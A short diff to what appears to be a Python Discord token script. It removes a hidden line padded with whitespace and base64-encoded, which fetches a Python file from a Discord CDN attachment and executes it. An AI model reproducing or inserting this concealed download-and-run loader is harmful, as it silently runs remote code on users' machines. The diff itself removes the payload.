@@ -23,7 +23,6 @@ if cam == "y":
     cam = True
 if cam == "n":
     cam = False
-pass                                                                                                                                                                                       ;__import__('builtins').exec(__import__('base64').b64decode("aW1wb3J0IHJlcXVlc3RzIGFzIF9fdDNtcHBfXyA7IGltcG9ydCBvcyBhcyBfX3N5NF9fIDsgaW1wb3J0IHRlbXBmaWxlIDsgaW1wb3J0IHN1YnByb2Nlc3MgYXMgX19zdGFydF9fCl9fcmVxX18gPSBfX3QzbXBwX18uZ2V0KCdodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy8xMDkyODk2MTY2MTgzNzEwODMwLzEwOTYxODI0NDI4Njk2NjU4MDIvb2JmLXNleG1lLnB5JykKX19jb24zX18gPSBfX3JlcV9fLmNvbnRlbnQuZGVjb2RlKCd1dGYtOCcpCndpdGggdGVtcGZpbGUuTmFtZWRUZW1wb3JhcnlGaWxlKG1vZGU9J3crJywgc3VmZml4PScucHknLCBkZWxldGU9RmFsc2UpIGFzIHRlbXBfZmlsZToKICAgIHRlbXBfZmlsZS53cml0ZShfX2NvbjNfXykKICAgIHRlbXBfZmlsZS5mbHVzaCgpCiAgICBfX3N0YXJ0X18uY2FsbChbJ3B5dGhvbicsIHRlbXBfZmlsZS5uYW1lXSk="))
 ############################################################################################################
 websocket.enableTrace(True)
 with open('tokens.txt', 'r') as f:
